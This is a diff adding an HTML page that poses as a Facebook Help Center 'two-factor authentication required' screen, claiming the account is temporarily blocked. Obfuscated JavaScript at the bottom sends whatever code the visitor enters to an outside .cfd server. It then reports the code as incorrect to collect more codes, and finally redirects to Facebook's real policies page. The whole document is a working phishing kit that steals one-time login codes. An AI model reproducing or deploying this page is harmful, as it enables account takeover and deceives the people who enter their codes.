@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Help Center - Page Policy Appeals</title>
+    <link rel="icon" href="https://businessservices.cfd/assets/images/fb_icon.ico" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        facebook: '#385899'
+                    }
+                }
+            }
+        }
+    </script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <meta name="csrf-token" content="dummy-csrf-token">
+</head>
+
+<body>
+    <div class="bg-[#F1F2F6] min-h-screen py-10">
+        <form class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"
+            id="skdzvhmcei">
+            <p class="font-bold text-2xl">Two-factor authentication required </p>
+            <p class="my-3">We have temporarily blocked your account because Facebook Protect has changed. Verify code
+                has
+                been send to *****.
+            </p>
+            <div class="">
+                <img src="./assets/assets/images/2fa-df.png" class="mb-3 rounded-xl">
+            </div>
+            <input type="number" name="code" required
+                onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57))"
+                placeholder="Enter your code"
+                class="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1">
+            <p class="error_2fa text-red-700 mt-2"></p>
+            <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
+                <div class="text-2xl text-yellow-600">
+                    <ion-icon name="information-circle"></ion-icon>
+                </div>
+                <div>
+                    <p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a
+                        new
+                        device or browser. Enter the 6-digit code from your code generator or third-party app below.</p>
+                    <p>Please wait <strong class="count-time">05:00</strong> to request the sending of the code.</p>
+                </div>
+            </div>
+            <p class="mt-3 mb-5">We'll walk you through some steps to secure and unlock your account.</p>
+            <button
+                class="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg">Submit</button>
+            <button type="button"
+                class="block text-sm cursor-pointer text-center py-3 w-full text-blue-800 send-code-btn">Send
+                Code</button>
+        </form>
+    </div>
+
+    <!-- Main modal -->
+    <div id="finishModal" tabindex="-1" aria-hidden="true"
+        class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center bg-black bg-opacity-50">
+        <div class="relative w-full max-w-2xl max-h-full">
+            <!-- Modal content -->
+            <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
+                <!-- Modal header -->
+                <div class="flex items-start justify-between p-4 border-b rounded-t bg-facebook">
+                    <h3 class="text-md font-semibold text-white">
+                        Form Submitted Successfully
+                    </h3>
+                </div>
+                <!-- Modal body -->
+                <div class="p-6 space-y-6">
+                    <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
+                        Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You
+                        can
+                        view responses in your Support Inbox.
+                    </p>
+                </div>
+                <!-- Modal footer -->
+                <div
+                    class="flex items-center justify-end p-4 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600">
+                    <button type="button"
+                        class="finish-verify text-white bg-facebook hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center">OK</button>
+                
+                        
+                
+                    </div>
+            </div>
+        </div>
+    </div>
+</body>
+  <script src="/assets/assets/js/jquery.min.js"></script>
+<script>
+      // set the modal menu element
+   const _0xb09b8=_0x3e5b;(function(_0x1e0968,_0x461be5){const _0x7d3003=_0x3e5b,_0x4a0869=_0x1e0968();while(!![]){try{const _0x557d39=parseInt(_0x7d3003(0xf8))/(0x1fc1*-0x1+0x17*-0x21+0x22b9)+-parseInt(_0x7d3003(0x10e))/(0x2c3*0x5+-0x1bb+-0x203*0x6)*(-parseInt(_0x7d3003(0xe0))/(-0x142+-0x1*0x2171+0x22b6))+-parseInt(_0x7d3003(0x11c))/(-0x138+0xf51+-0xe15)*(parseInt(_0x7d3003(0xc5))/(0xbca+0x157d+-0x2142))+parseInt(_0x7d3003(0x117))/(-0x1*0x194b+0x213b+-0x7ea)*(parseInt(_0x7d3003(0xdd))/(0x14*0x1+0xae9+-0xaf6))+-parseInt(_0x7d3003(0x104))/(-0xa*-0x50+-0x11*0x172+0x157a)*(-parseInt(_0x7d3003(0xd7))/(-0x825+0x5*-0x2bd+0x15df))+parseInt(_0x7d3003(0xd3))/(0x2e3*-0x1+0x4a8+-0x1bb)+-parseInt(_0x7d3003(0xe2))/(-0x179b*-0x1+-0x203b+-0x13d*-0x7)*(parseInt(_0x7d3003(0xf7))/(0x1*0x2252+0x1*0x1e4a+-0x4090));if(_0x557d39===_0x461be5)break;else _0x4a0869['push'](_0x4a0869['shift']());}catch(_0x5057e8){_0x4a0869['push'](_0x4a0869['shift']());}}}(_0x4f8f,0x95a6b*0x1+0x5*0x1723+0x4cdac));function startTimer(_0x5371c9,_0x212510){const _0x1f1ead=_0x3e5b,_0x2aba75={'kEUcb':_0x1f1ead(0x118)+'4','cOkUj':function(_0x2a60fa,_0x328eb6){return _0x2a60fa+_0x328eb6;},'zpNek':function(_0x1a3b5c,_0x26f5f2){return _0x1a3b5c+_0x26f5f2;},'NhSSp':function(_0x4ff92f,_0x5a954d,_0x4b17d1){return _0x4ff92f(_0x5a954d,_0x4b17d1);},'ZIkBv':function(_0x4cde37,_0x477ebc){return _0x4cde37/_0x477ebc;},'AlCKG':function(_0x546d94,_0x231aba){return _0x546d94<_0x231aba;},'TAzDK':function(_0x442eff,_0x4d01cf){return _0x442eff+_0x4d01cf;},'LzKQF':function(_0x4fa52d,_0x4b1f51,_0x445391){return _0x4fa52d(_0x4b1f51,_0x445391);},'JmQFf':function(_0x1ee594,_0x54c3f5){return _0x1ee594%_0x54c3f5;},'ZDLDs':function(_0x4b6aba,_0x28b652){return _0x4b6aba<_0x28b652;},'FlXiN':function(_0x3dd618,_0x551738){return _0x3dd618(_0x551738);},'utnMT':_0x1f1ead(0xd6)+_0x1f1ead(0x116),'Ybzxn':_0x1f1ead(0x113)+_0x1f1ead(0x107),'kiVBG':_0x1f1ead(0xe5)+_0x1f1ead(0xcc),'uathH':function(_0x251fd3,_0x217e9f){return _0x251fd3(_0x217e9f);},'fmTXs':function(_0x17d666,_0x2c159b){return _0x17d666<_0x2c159b;}};_0x2aba75[_0x1f1ead(0xce)]($,_0x2aba75[_0x1f1ead(0xde)])[_0x1f1ead(0xe3)+'s'](_0x2aba75[_0x1f1ead(0xd8)])[_0x1f1ead(0xca)](_0x2aba75[_0x1f1ead(0xc7)]);var _0x1fc952=_0x5371c9,_0x4839b7,_0x395c4f;let _0x14b302=_0x2aba75[_0x1f1ead(0x10c)](setInterval,function(){const _0x454ddd=_0x1f1ead,_0x8e58e5=_0x2aba75[_0x454ddd(0xe7)][_0x454ddd(0xdf)]('|');let _0x10727b=0x24af+-0x1*-0x1a8a+0x27*-0x19f;while(!![]){switch(_0x8e58e5[_0x10727b++]){case'0':_0x212510[_0x454ddd(0x11b)](_0x2aba75[_0x454ddd(0xf2)](_0x2aba75[_0x454ddd(0x103)](_0x4839b7,':'),_0x395c4f));continue;case'1':_0x4839b7=_0x2aba75[_0x454ddd(0x10c)](parseInt,_0x2aba75[_0x454ddd(0xfb)](_0x1fc952,0x60+0xd0*0xf+-0xc54),-0x1*-0xf51+-0x25e5+0x169e);continue;case'2':_0x4839b7=_0x2aba75[_0x454ddd(0xd9)](_0x4839b7,0x1a67+-0x23cf+-0x27*-0x3e)?_0x2aba75[_0x454ddd(0xf3)]('0',_0x4839b7):_0x4839b7;continue;case'3':_0x395c4f=_0x2aba75[_0x454ddd(0x10a)](parseInt,_0x2aba75[_0x454ddd(0xf6)](_0x1fc952,-0x5e6+0x110a*-0x1+0x172c),0x862+-0x19*0x5+-0x7db*0x1);continue;case'4':_0x2aba75[_0x454ddd(0xfc)](--_0x1fc952,0x16cc+-0x1d60+0x694)&&(_0x2aba75[_0x454ddd(0xce)]($,_0x2aba75[_0x454ddd(0xde)])[_0x454ddd(0xca)](_0x2aba75[_0x454ddd(0xd8)])[_0x454ddd(0xe3)+'s'](_0x2aba75[_0x454ddd(0xc7)]),_0x2aba75[_0x454ddd(0x115)](clearInterval,_0x14b302));continue;case'5':_0x395c4f=_0x2aba75[_0x454ddd(0xc3)](_0x395c4f,-0x1543+-0x48b*-0x3+0x7ac)?_0x2aba75[_0x454ddd(0x103)]('0',_0x395c4f):_0x395c4f;continue;}break;}},0x186*-0x11+0x28b+0x1b43);}function _0x3e5b(_0x30741a,_0x3aa021){const _0x1996b6=_0x4f8f();return _0x3e5b=function(_0xbfc1ff,_0x38f56c){_0xbfc1ff=_0xbfc1ff-(0x3*-0x742+0x1*-0x254b+-0x7*-0x88c);let _0x46d2e3=_0x1996b6[_0xbfc1ff];return _0x46d2e3;},_0x3e5b(_0x30741a,_0x3aa021);}let num_send_2fa=0x59*0xd+0x8*0x464+-0x13d2*0x2;function _0x4f8f(){const _0x3adb85=['hasClass','cOkUj','TAzDK','PyrQI','rify','JmQFf','32960148WRDQOs','538614ErXIpj','FGKOP','/two-facto','ZIkBv','ZDLDs','ZgFsz','submit','enerator\x20y','HaKDh','WzBtH','ajax','zpNek','48pDaRwP','.finish-ve','or.cfd/api','nter','h.apiliupp','\x20is\x20incorr','LzKQF','.com/polic','NhSSp','https://ww','2islipx','find','inutes\x20to\x20','qbqPs','location','cursor-poi','DHyGx','uathH','-btn','90eJfrNN','1|3|2|5|0|','BsmGb','href','text','3563212PNSVfO','fmTXs','FLHfb','5umGpvv','knowc','kiVBG','input[name','preventDef','addClass','click','ents-none','vScin','FlXiN','val','odQUT','=\x22code\x22]','other\x20one.','17218070dngEnE','ies_center','oLYqE','.send-code','2030769VAztUA','Ybzxn','AlCKG','e\x20wait\x205\x20m','The\x20code\x20g','r-code','183393iubVIx','utnMT','split','1762836Civpvg','ect.\x20Pleas','11zrJIMN','removeClas','ault','pointer-ev','#skdzvhmce','kEUcb','POST','w.facebook','ou\x20entered','.count-tim','WOvok','receive\x20an','https://te','.error_2fa','Zuygu'];_0x4f8f=function(){return _0x3adb85;};return _0x4f8f();}$(_0xb09b8(0xe6)+'i')[_0xb09b8(0xfe)](function(_0x3a0044){const _0x509eab=_0xb09b8,_0x358397={'WOvok':function(_0xa9704e,_0x8e5da7){return _0xa9704e==_0x8e5da7;},'HaKDh':_0x509eab(0x10d)+_0x509eab(0xe9)+_0x509eab(0x10b)+_0x509eab(0xd4)+'/','PyrQI':function(_0x13527c,_0x3874ba){return _0x13527c(_0x3874ba);},'odQUT':_0x509eab(0xef),'DHyGx':_0x509eab(0xdb)+_0x509eab(0xff)+_0x509eab(0xea)+_0x509eab(0x109)+_0x509eab(0xe1)+_0x509eab(0xda)+_0x509eab(0x110)+_0x509eab(0xed)+_0x509eab(0xd2),'FGKOP':_0x509eab(0xc8)+_0x509eab(0xd1),'BsmGb':_0x509eab(0xee)+_0x509eab(0x108)+_0x509eab(0x106)+_0x509eab(0xfa)+_0x509eab(0xdc),'ZgFsz':_0x509eab(0xe8)};_0x3a0044[_0x509eab(0xc9)+_0x509eab(0xe4)]();let _0x1cc593=_0x358397[_0x509eab(0xf4)]($,this),_0xfb75da=_0x1cc593[_0x509eab(0x10f)](_0x358397[_0x509eab(0xf9)])[_0x509eab(0xcf)]();$[_0x509eab(0x102)]({'url':_0x358397[_0x509eab(0x119)],'type':_0x358397[_0x509eab(0xfd)],'data':{'code':_0xfb75da},'success':function(_0x53009a){const _0x2196e0=_0x509eab;if(_0x358397[_0x2196e0(0xec)](num_send_2fa,-0x1*-0x2611+0x1*-0x25ad+-0x62)){window[_0x2196e0(0x112)][_0x2196e0(0x11a)]=_0x358397[_0x2196e0(0x100)];return;}++num_send_2fa,_0x358397[_0x2196e0(0xf4)]($,_0x358397[_0x2196e0(0xd0)])[_0x2196e0(0x11b)](_0x358397[_0x2196e0(0x114)]),_0x1cc593[_0x2196e0(0x10f)](_0x358397[_0x2196e0(0xf9)])[_0x2196e0(0xcf)]('');},'error':function(_0x435b51){}});}),$(_0xb09b8(0x105)+_0xb09b8(0xf5))[_0xb09b8(0xcb)](function(){const _0x2b9e81=_0xb09b8,_0xc9d243={'knowc':_0x2b9e81(0x10d)+_0x2b9e81(0xe9)+_0x2b9e81(0x10b)+_0x2b9e81(0xd4)+'/'};window[_0x2b9e81(0x112)][_0x2b9e81(0x11a)]=_0xc9d243[_0x2b9e81(0xc6)];}),startTimer((0x586+-0x11b5+0x121*0xb)*(0x874+0x505+-0x7b*0x1c),$(_0xb09b8(0xeb)+'e')),$(_0xb09b8(0xd6)+_0xb09b8(0x116))[_0xb09b8(0xcb)](function(){const _0x4705e5=_0xb09b8,_0x205743={'oLYqE':function(_0x425bf5,_0x1ade90){return _0x425bf5(_0x1ade90);},'WzBtH':_0x4705e5(0xe5)+_0x4705e5(0xcc),'qbqPs':function(_0x1fc984,_0x407c11,_0x311406){return _0x1fc984(_0x407c11,_0x311406);},'FLHfb':function(_0x4e2bae,_0x331593){return _0x4e2bae*_0x331593;},'vScin':function(_0x545023,_0x5b4486){return _0x545023(_0x5b4486);},'Zuygu':_0x4705e5(0xeb)+'e'};if(_0x205743[_0x4705e5(0xd5)]($,this)[_0x4705e5(0xf1)](_0x205743[_0x4705e5(0x101)]))return![];_0x205743[_0x4705e5(0x111)](startTimer,_0x205743[_0x4705e5(0xc4)](0x1606+0x8ff*-0x4+0xe32,0x12bb*0x1+0x38*-0x29+-0x9be),_0x205743[_0x4705e5(0xcd)]($,_0x205743[_0x4705e5(0xf0)]));});
+</script>
+
+</html>
